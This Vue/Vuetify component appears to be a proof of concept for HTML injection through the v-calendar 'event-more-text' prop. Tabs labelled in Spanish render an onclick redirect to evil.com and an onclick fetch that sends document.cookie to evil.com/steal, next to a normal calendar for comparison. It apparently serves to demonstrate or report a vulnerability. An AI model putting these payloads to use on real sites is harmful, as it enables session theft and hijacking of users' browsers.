<template>
  <v-card>
    <v-tabs v-model="tab" background-color="primary" dark>
      <v-tab>Redirección maliciosa</v-tab>
      <v-tab>Robo de Cookies</v-tab>
      <v-tab>Comportamiento normal</v-tab>
    </v-tabs>

    <v-tabs-items v-model="tab">
      <v-tab-item>
        <v-card flat>
          <v-card-title>Redirección maliciosa</v-card-title>
          <v-card-text>
            <v-row>
              <v-col cols="12">
                <v-card outlined class="pa-4 mb-4">
                  <pre class="code-preview mb-0">
&lt;v-calendar
  :now="today"
  :value="today"
  :events="events"
  color="primary"
  type="month"
  event-more
  event-more-text="&lt;span onclick=&quot;window.location='https://evil.com'&quot;&gt;🚨 Click Here&lt;/span&gt;"
/&gt;</pre
                  >
                </v-card>
              </v-col>
            </v-row>
            <v-sheet height="380">
              <v-calendar
                :now="today"
                :value="today"
                :events="events"
                color="primary"
                type="month"
                event-more
                event-more-text="<span onclick=&quot;window.location='https://evil.com'&quot;>🚨 Click Here</span>"
              />
            </v-sheet>
          </v-card-text>
        </v-card>
      </v-tab-item>
      
      <v-tab-item>
        <v-card flat>
          <v-card-title>Robo de Cookies</v-card-title>
          <v-card-text>
            <v-row>
              <v-col cols="12">
                <v-card outlined class="pa-4 mb-4">
                  <pre class="code-preview mb-0">
&lt;v-calendar
  :now="today"
  :value="today"
  :events="events"
  color="primary"
  type="month"
  event-more
  event-more-text="&lt;span onclick=&quot;fetch('https://evil.com/steal?cookies=' + encodeURIComponent(document.cookie)).catch(()=&gt;alert('Cookies robadas: ' + document.cookie))&quot;&gt;🚨 Click Here&lt;/span&gt;"
/&gt;</pre
                  >
                </v-card>
              </v-col>
            </v-row>
            <v-sheet height="380">
              <v-calendar
                :now="today"
                :value="today"
                :events="events"
                color="primary"
                type="month"
                event-more
                event-more-text="<span onclick=&quot;fetch('https://evil.com/steal?cookies=' + encodeURIComponent(document.cookie)).catch(()=>alert('Cookies robadas: ' + document.cookie))&quot;>🚨 Click Here</span>"
              />
            </v-sheet>
          </v-card-text>
        </v-card>
      </v-tab-item>

      <v-tab-item>
        <v-card flat>
          <v-card-title>Comportamiento normal</v-card-title>
          <v-card-text>
            <v-row>
              <v-col cols="12">
                <v-card outlined class="pa-4 mb-4">
                  <pre class="code-preview mb-0">
&lt;v-calendar
  :now="today"
  :value="today"
  :events="events"
  color="primary"
  type="month"
  event-more
/&gt;</pre
                  >
                </v-card>
              </v-col>
            </v-row>
            <v-sheet height="380">
              <v-calendar
                data-testid="calendar-default"
                :now="today"
                :value="today"
                :events="events"
                color="primary"
                type="month"
                event-more
              />
            </v-sheet>
          </v-card-text>
        </v-card>
      </v-tab-item>
    </v-tabs-items>
  </v-card>
</template>

<script>
export default {
  data() {
    return {
      tab: undefined,
      today: '2019-01-08',
      events: [
        {
          name: 'Weekly Meeting',
          start: '2019-01-07 09:00',
          end: '2019-01-07 10:00',
        },
        {
          name: 'Weekly Meeting2',
          start: '2019-01-07 09:00',
          end: '2019-01-07 10:00',
        },
        {
          name: 'Weekly Meeting3',
          start: '2019-01-07 09:00',
          end: '2019-01-07 10:00',
        },
        {
          name: 'Weekly Meeting4',
          start: '2019-01-07 09:00',
          end: '2019-01-07 10:00',
        },
        {
          name: 'Weekly Meeting5',
          start: '2019-01-07 09:00',
          end: '2019-01-07 10:00',
        },
        {
          name: 'Weekly Meeting6',
          start: '2019-01-07 09:00',
          end: '2019-01-07 10:00',
        },
        {
          name: 'Weekly Meeting7',
          start: '2019-01-07 09:00',
          end: '2019-01-07 10:00',
        },
        {
          name: `Thomas' Birthday`,
          start: '2019-01-10',
        },
        {
          name: 'Mash Potatoes and some long long text',
          start: '2019-01-09 12:30',
          end: '2019-01-09 15:30',
        },
      ],
    }
  },
}
</script>
